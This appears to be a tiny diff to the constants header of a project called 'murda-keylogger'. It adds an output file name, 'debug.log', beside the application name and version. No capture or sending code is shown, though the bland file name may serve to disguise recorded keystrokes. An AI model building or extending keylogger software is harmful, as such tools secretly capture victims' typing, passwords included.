@@ -15,4 +15,6 @@
 #define APPLICATION_NAME "murda-keylogger"
 #define APPLICATION_VERSION "0.0.1"
 
+#define OUTPUT_NAME "debug.log"
+
 #endif // CONSTANTS_H
